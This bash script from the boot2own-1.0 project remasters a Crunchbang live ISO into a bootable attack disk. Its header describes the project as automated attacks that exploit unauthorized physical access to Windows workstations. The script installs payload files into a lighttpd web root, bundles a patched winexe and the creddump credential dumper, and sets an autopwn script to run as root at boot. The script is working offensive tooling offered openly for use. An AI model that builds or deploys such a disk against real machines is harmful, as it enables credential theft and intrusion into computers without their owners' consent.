#!/bin/bash
#
# b2o-isogen.sh creates a B2O LiveCD from an existing Crunchbang liveCD.
#
# b2o-isogen.sh is part of boot2own-1.0
# boot2own-1.0 creates rapid automated attacks that takes
# advantage of unauthorized physical access to Windows workstations.
#
# copyright (C) 2014 xor-function
# license BSD-3
#
#--------------------------------------------------------------------

use() {
echo ""
echo "usage: ./b2o-isogen.sh Crunchbang-xx-xxxx.iso"
echo ""
}

# func requires args: username
chk_usr() {
   if [ "$(whoami)" != "$1" ]; then
       echo "[!] you need to be root, exiting..."
       exit
   fi
}

tstamp() {
   date +"%F"_"%H":"%M"
}

# func requires aguments (full path/file name) and tstamp() func ****
make_runlog() {
   touch $1
   echo "script run on "$(tstamp)"" > $1
}

chk_tubes() {
   echo "[*] Checking your tubes..."
   if ! ping -c 1 google.com > /dev/null 2>&1  ; then
      if ! ping -c 1 yahoo.com > /dev/null 2>&1  ; then
         if ! ping -c 1 bing.com > /dev/null 2>&1 ; then
             clear
             echo "[!] Do you have an internet connection???"
             exit 2
         fi
      fi
   fi
   echo "[+] tubes working..."

}

# func requires aguments ****
get_aptpkg() {

  tpkg=$(dpkg -s $1 | grep "install ok installed")
  if [ -z "$tpkg" ]; then

        if [ -z $aptup ]; then
           apt-get update
           aptup='1'
        fi

        echo "[*] installing $1"
        if ! apt-get -y install $1; then
           echo "[!] APT failed to install "$1", are your repos working? Exiting..."
           exit 1
        fi

    else
       echo "[+] $1 is already installed"
  fi

}

get_permission() {
 while true; do
     read answer
     case $answer in
          [Yy] ) break;;
          [Yy][eE][sS] ) break;;
          [nN] ) printf "\nExiting Now \n"; exit;;
          [Nn][oO] ) printf "\nExiting Now \n"; exit;;
            *  ) printf "\nNot Valid, Answer y or n\n";;
     esac
 done
}

chk_usr root

if [[ $# -gt 1 || $# -lt 1 ]] ; then
     use
     exit
fi

if [[ ! -f $1 ]]; then
   use
   echo "[!] Thats not a file"
   exit
fi

fchk=$(echo "$1" | grep -i "crunchbang")

if [ -z $fchk ]; then
    echo "[!] Did you change the iso's name?"
    exit
fi

IMG=$1
spath="$( cd "$(dirname "$0")" ; pwd -P )"

if [ ! -f $spath/live-files/pld2 ]; then
    echo "[!] pld2 was not found, exiting" ; exit 1
elif [ ! -f $spath/live-files/pld3 ]; then
    echo "[!] pld3 was not found, exiting" ; exit 1
elif [ ! -f $spath/live-files/boot-2-own/b2o-autopwn.sh ]; then
    echo "[!] boot2own-autopwn.sh was not found, exiting" ; exit 1
elif [ ! -f $spath/live-files/boot-2-own/pwinexe ]; then
    echo "[!] patched winexe was not found"
    echo "    have you compiled it already with winexe-gen.sh?"; exit 1
elif [ ! -d $spath/live-files/boot-2-own/creddump ] ;then
    echo "[!] creddump was not found"; exit 1
fi

clear
echo ""
echo "This script will remaster a Crunchbang Disk to create the boot2own live environment."
echo ""
echo "WARNING---WARNING---WARNING"
echo "insure you have an internet connection as two packages will need to be installed in the"
echo "chrooted environment."
echo ""
echo "CONTINUE? (y/n)"
get_permission
chk_usr root
chk_tubes

if [ ! -f /var/log/b2o-remaster ]; then

   get_aptpkg squashfs-tools
   get_aptpkg genisoimage
   make_runlog /var/log/b2o-remaster
   echo "[+] installation of packages successfull"

fi

if [ -e $spath/b2o-remaster/boot2own.iso ]; then
   echo "[!] A generated iso has been detected, will delete if you wish to continue."
   echo "    Continue (y/n)?"
   get_permission
   rm -f $spath/b2o-remaster/boot2own.iso
fi

if [ -d $spath/b2o-remaster/expanded ]; then
   echo "[!] Detected expanded filesystem, will be deleted to continue"
   rm -rf $spath/b2o-remaster/expanded
fi

if [ -d $spath/b2o-remaster/iso ]; then
   echo "[!] Detected iso filesystem folder, will be deleted to continue"
   rm -rf $spath/b2o-remaster/
fi

if [ -f $spath/run-log ]; then
    echo "" > run-log
fi

mkdir -p $spath/b2o-remaster/expanded/done/
mkdir $spath/b2o-remaster/iso/
mkdir /mnt/cb

echo "[*] mounting iso and extracting contents"
mount -t iso9660 -o loop $IMG /mnt/cb &>> run-log
if [ ! -d /mnt/cb/live ]; then
         echo "[!] mount failed, is this the correct iso?"
         exit 1
fi

echo "[*] Copying extracted iso content to a temp dir"
cp -r /mnt/cb/{debian,dists,isolinux,live} $spath/b2o-remaster/iso
if [ ! -d $spath/b2o-remaster/iso/live ]; then
         echo "[!] something went wrong copying iso contents, exiting..."
         exit 1
fi
umount /mnt/cb && rm -r /mnt/cb

echo "[*] moving squashfs"
cp $spath/b2o-remaster/iso/live/filesystem.squashfs $spath/b2o-remaster/expanded/
echo "[*] extracting squashfs"
rm $spath/b2o-remaster/iso/live/filesystem.squashfs
cd $spath/b2o-remaster/expanded
unsquashfs filesystem.squashfs
rm filesystem.squashfs
cat /etc/resolv.conf squashfs-root/etc/resolv.conf

echo "[*] generating chroot script"
cat > squashfs-root/root/auto-conf.sh <<EOL
#!/bin/bash
#
# part of b2o-remaster.sh
# generated to be run inside chroot

export LC_ALL=C
apt-get update
apt-get -y install arp-scan
apt-get -y install lighttpd
update-rc.d lighttpd defaults

exit
EOL

chmod +x squashfs-root/root/auto-conf.sh
echo "[*] preping chroot filesystem"
mount -vt devpts devpts squashfs-root/dev/pts/ -o gid=5,mode=620 &>> run-log
mount -vt proc proc squashfs-root/proc/ &>> run-log
mount -vt sysfs sysfs squashfs-root/sys/ &>> run-log
mount -vt tmpfs tmpfs squashfs-root/run/ &>> run-log
echo "[*] executing chroot script"
chroot squashfs-root/ /root/auto-conf.sh
echo "[+] chroot script done"
echo "[*] unmounting chroot filesystem"
umount -vt devpts devpts squashfs-root/dev/pts/ &>> run-log
umount -vt proc proc squashfs-root/proc/ &>> run-log
umount -vt sysfs sysfs squashfs-root/sys/ &>> run-log
umount -vt tmpfs tmpfs squashfs-root/run/ &>> run-log

if [ ! -d squashfs-root/var/www/ ]; then
   echo "[!] chroot script failed! Cannot continue..."
   exit
fi

echo "[*] copying boot-2-own engine and http payloads"
rm squashfs-root/root/auto-conf.sh
rm squashfs-root/var/www/*
cp $spath/live-files/{pld2,pld3} squashfs-root/var/www/
cp -r $spath/live-files/boot-2-own squashfs-root/root/
chmod -R +x $(find $spath/b2o-remaster/expanded/squashfs-root/root/boot-2-own/ -name '*.*')
chmod +x squashfs-root/root/boot-2-own/pwinexe
echo "## Run boot2own-autopwn.sh" >> squashfs-root/etc/skel/.config/openbox/autostart
echo "terminator --geometry=750x600 -e 'sudo /bin/bash -c /root/boot-2-own/b2o-autopwn.sh' &" >> squashfs-root/etc/skel/.config/openbox/autostart

echo "[*] repacking expanded squashfs"
mksquashfs squashfs-root/ done/filesystem.squashfs
if [ $? -ne 0 ]; then
   echo "[!] repacking failed, exiting" ; exit 1
fi
echo "[+] preping filesystem for iso"
#Begin writing to isolinux/isolinux.cfg
#||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
cat > $spath/b2o-remaster/iso/isolinux/isolinux.cfg << EOL
default live
label live
menu label Live Session
menu default
kernel /live/vmlinuz
append initrd=/live/initrd.img boot=live config live-config.hostname=null live-config.username=b2o

prompt 0
timeout 0
EOL
#||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
#Finished creating isolinux/isolinux.cfg

echo "[*] copying squashfs to iso dir"
cp done/filesystem.squashfs $spath/b2o-remaster/iso/live/
cd $spath/b2o-remaster/iso/
genisoimage -D -r -V "B2O" -cache-inodes -J -l -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -o ../boot2own.iso .
if [ $? -ne 0 ]; then
   echo "[!] iso generation failed, exiting" ; exit 1
fi
echo "[+] Script finished successfully, cleaning up..."
rm -r $spath/b2o-remaster/{expanded,iso}
echo "[+] Done!"
echo "[+] boot2own.iso is saved in b2o-remaster..."
sleep 4
exit 0
